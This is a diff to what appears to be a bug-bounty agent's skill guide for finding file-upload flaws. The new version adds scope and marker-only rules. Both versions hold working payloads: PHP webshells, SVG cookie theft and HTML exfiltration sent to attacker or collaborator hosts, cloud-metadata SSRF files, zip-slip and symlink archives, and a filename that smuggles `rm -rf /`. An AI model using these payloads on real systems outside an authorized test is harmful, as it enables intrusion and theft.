@@ -3,157 +3,112 @@ name: hunt-file-upload
 description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples."
 ---
 
-## 9. FILE UPLOAD
+# HUNT-FILE-UPLOAD — Upload, process, fetch
 
-### Content-Type Bypass
-```
-filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
-filename=shell.phtml, shell.pHp, shell.php5   → extension variants
-```
+An upload is a finding only when something **later** uses the bytes: the web server executes them, a browser renders them on the target origin, a parser reads a file or a URL from inside them, or the extractor writes outside the destination. "File stored" is not a bug.
 
-### File Upload Bypass Techniques (10 techniques)
+## Rails
+- In-scope only. One file, one follow-up request.
+- No webshell left behind, no `rm`, no memory-corruption crashers (crafted WebP/ImageMagick heap overflows). A crash is DoS.
+- Marker first. A one-shot `id` or a unique string only after the marker proves the file is fetched or executed.
+- Zip-slip and `.htaccess` / `web.config` writes are state-changing — one harmless marker file, then stop.
+- Stop at draft. Never auto-submit.
 
-| Attack | How | Prevention |
-|---|---|---|
-| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
-| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
-| Double extension | `shell.jpg.php` | Only allow single extension |
-| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
-| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
-| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
-| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
-| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
-| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
-| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |
+## Decision tree
 
-### Magic Bytes Reference
+1. **Find the sink.** Multipart upload, avatar, attachment, import, theme, font, CSV, resume, invoice, "convert", video/image pipeline, support ticket.
+2. **Note the stack** from headers and the URL the app returns (`Location`, JSON `url`, CDN host). PHP, JSP/ASP, Node static, S3/GCS, and "parser only" are different endings.
+3. **Upload a harmless marker** (`MARK-<uniq>.txt` or a tiny PNG) and see if you can fetch that URL. Record content-type and whether the body is sniffed or forced to `Content-Disposition: attachment`.
+4. **Branch on what you were allowed to store:**
 
-| Type | Hex |
+   | Fetched body | Try | Proof |
+   |---|---|---|
+   | Script extension executed (PHP/JSP/ASPX) | one `<?php echo md5("UPUNIQ"); system("id"); ?>` or the stack's equivalent | md5 or `uid=` from **GET of the returned URL** |
+   | HTML/SVG served same-origin, sniffed as active content | SVG/HTML below | script runs in a browser on that origin, or the response is `image/svg+xml` without attachment |
+   | Image/doc pipeline (ImageMagick, Ghostscript, ffmpeg, LibreOffice, wkhtmltopdf, headless Chrome) | URL or file read **inside** the format | Collaborator hit or file bytes in the output |
+   | ZIP/TAR/7z extracted | path inside the archive | marker contents at the traversed path, fetched once |
+   | S3/CDN with `Content-Type` you set | HTML on a domain that is not the app origin | XSS only if that domain holds cookies or a privileged origin. Otherwise say "uploaded HTML on a sandbox domain" and do not claim ATO |
+   | Download forced, never rendered, never parsed | stop | not a finding |
+
+5. **Extension games** only if a normal `.php`/`.jsp`/`.aspx` was rejected and the stack can execute that language. Order: alternative extension, double extension, case, trailing dot/space, content-type lie, magic-byte prefix. Null byte `%00` only on very old PHP. Stop at the first file that executes.
+
+## Bypasses (execution)
+
+| Goal | Names to try |
 |---|---|
-| JPEG | `FF D8 FF` |
-| PNG | `89 50 4E 47 0D 0A 1A 0A` |
-| GIF | `47 49 46 38` |
-| PDF | `25 50 44 46` |
-| ZIP/DOCX/XLSX | `50 4B 03 04` |
+| PHP | `.php`, `.phtml`, `.php5`, `.phar`, `.php8`, `.inc`, `.php.`, `.php%20`, `.pHp` |
+| IIS / ASP | `.aspx`, `.ashx`, `.asmx`, `.cer`, `.config` |
+| Java | `.jsp`, `.jspx`, `.war` (only if the container auto-deploys — one probe) |
+| Apache handler | one `.htaccess` with `AddType application/x-httpd-php .mark` plus `shell.mark` that prints the marker |
+| IIS handler | one `web.config` requestFiltering/handlers change, same marker |
+| PHP-FPM user.ini | `.user.ini` `auto_prepend_file` only if you can already upload a second file you control |
+| MIME trust | `Content-Type: image/jpeg` with a script body — only matters if the **fetcher** executes it |
+| Magic sniff | prefix `GIF89a` before `<?php ... ?>` when the check is the first bytes and the engine still runs the rest |
+| Polyglot | valid image **and** a script only if both a resizer and the PHP engine process the same object — prove execution, not the image header |
 
-### Stored XSS via SVG
+Filename command injection (`;id`, `$(id)`, backticks) when the name is passed to `exec`/`convert`/`ffmpeg`. OOB `UNIQUE.collab`. One shot. Never `; rm`.
+
+## Content bugs
+
+**SVG / HTML** (same origin, not downloaded as an attachment):
 ```xml
-<?xml version="1.0"?>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>alert(document.domain)</script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://UNIQUE.collab/'+document.domain)">
+  <script>document.title='UPUNIQ'</script>
 </svg>
 ```
+`alert` in your own session is stored XSS only if another user (or a victim browser you do not need — a second account opening the URL) would run it. If the CDN serves `Content-Disposition: attachment` or a sandboxed domain, say so and drop ATO claims.
 
----
+**DOCX/XLSX/PPTX and SVG XXE** → `hunt-xxe`. Inject into `word/document.xml` or `[Content_Types].xml`. Proof is file bytes or one OOB fetch.
 
-## ImageMagick / FFmpeg Exploitation
-
-### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
-```bash
-# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
-# MVG SSRF payload — fetches internal URL during processing
-cat > /tmp/ssrf.mvg << 'EOF'
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
-pop graphic-context
-EOF
-
-# SVG SSRF (ImageMagick processes SVG remotely)
-cat > /tmp/ssrf.svg << 'EOF'
-<?xml version="1.0"?>
-<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
-</svg>
-EOF
-
-# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
-# Upload a crafted WebP file targeting libwebp heap overflow
-# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
+**Image / video URL fetch** (Collaborator, not a crash file):
 ```
-
-### FFmpeg SSRF via HLS Playlist
-```bash
-# FFmpeg processes m3u8 playlists and fetches referenced segments
-cat > /tmp/ssrf.m3u8 << 'EOF'
+# SVG / MVG processed by ImageMagick or a similar loader
+<image xlink:href="http://UNIQUE.collab/img"/>
+fill 'url(http://UNIQUE.collab/mvg)'
+```
+```
+# ffmpeg / HLS
 #EXTM3U
-#EXT-X-MEDIA-SEQUENCE:0
-#EXTINF:10.0,
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-#EXT-X-ENDLIST
-EOF
-
-# Also works with concat demuxer
-cat > /tmp/concat.txt << 'EOF'
-ffconcat version 1.0
-file 'http://COLLAB_HOST/ffmpeg-ssrf'
-EOF
-
-# Test: upload .m3u8 or video file to any video processing endpoint
+#EXTINF:1,
+http://UNIQUE.collab/hls
 ```
+Legacy ImageMagick delegates (`CVE-2016-3714` class) and Ghostscript `%!PS` file reads are in play only when a callback or file bytes return. If policy.xml blocks delegates, record that and move on. Do not upload a memory-corruption PoC.
 
----
+**HTML → PDF / screenshot**
+```html
+<iframe src="file:///etc/passwd"></iframe>
+<link rel="stylesheet" href="http://UNIQUE.collab/css">
+```
+Proof is `root:x:0:0:` in the PDF/image, or the CSS/HTTP hit from the converter's IP. JS in the PDF engine is RCE only with a callback.
 
-## Headless Chrome / PDF Generator SSRF
-
-### HTML → PDF Converter Attacks
+**Archive slip.** Python's `zipfile` may normalize `..`; write the name explicitly and verify with `unzip -l`:
+```python
+import zipfile
+z = zipfile.ZipFile('/tmp/slip.zip','w')
+zi = zipfile.ZipInfo('../mark-UNIQ.txt')
+z.writestr(zi, b'mark-UNIQ')
+z.close()
+```
+TAR symlink (do **not** pass `--dereference`, which stores the target bytes instead of the link):
 ```bash
-# Target: invoice generators, report exporters, screenshot services
-# Inject HTML that causes headless Chrome to fetch internal resources
-
-# SSRF via CSS import
-PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'
-
-# SSRF via HTML iframe
-PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
-
-# Local file read
-PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
-
-# JavaScript execution (if sandbox not enforced)
-PAYLOAD='<html><body><script>
-fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
-</script></body></html>'
-
-# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
-curl -s -X POST "https://$TARGET/api/generate-pdf" \
-  -H "Content-Type: application/json" \
-  -d "{\"html\": \"$PAYLOAD\"}"
+ln -s /etc/passwd mark.txt
+tar -cf slip.tar mark.txt
 ```
+Proof: fetch `mark-UNIQ.txt` or see `root:x:0:0:` from the symlink extraction. One path. Do not aim at a cron directory or a shell path until a marker has already landed and the engagement allows a single `id` file you then remove.
 
----
+## Validation
+- **RCE:** GET the URL the app gave you; body contains `uid=` or the md5 hex of the literal `UPUNIQ`. A 200 from the upload API is not execution.
+- **XSS:** the browser runs the script on the target origin from the file URL. `text/plain` or `attachment` = no XSS.
+- **SSRF / XXE:** Collaborator hit from the server, or file contents inside the converted output.
+- **Traversal write:** the marker is readable at the escaped path. Then stop.
+- **Not a finding:** stored blob you cannot fetch, AV "skipped", polyglot that only opens as an image.
 
-## Archive Extraction Attacks (Zip Slip / Symlink)
-
-```bash
-# Zip Slip — path traversal via archive filenames
-pip3 install evilarc
-python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip
-
-# Symlink attack — archive contains symlink to sensitive file
-mkdir -p /tmp/sym_attack
-ln -s /etc/passwd /tmp/sym_attack/innocent.txt
-zip -ry /tmp/symlink.zip /tmp/sym_attack/
-
-# TAR symlink attack
-tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/
-
-# Test: upload to any /import, /extract, /unzip endpoint
-curl -s -X POST "https://$TARGET/api/import" \
-  -F "file=@/tmp/zipslip.zip"
-```
-
----
-
-## Related Skills & Chains
-
-- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
-- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
-- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
-- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
-- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
-- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
+## Chains
+- Executed script → `hunt-rce` (one command). Same request, one report.
+- DOCX/SVG parser → `hunt-xxe`.
+- SVG/HTML on the app origin → `hunt-xss` (second account loads it once).
+- Image URL fetch of `169.254.169.254` → `hunt-ssrf`. IMDSv2 401 is not keys.
+- `phar` metadata on an image the server passes to `file_exists` → `hunt-deserialization`.
 
 ## Before you report — dedup gate
 
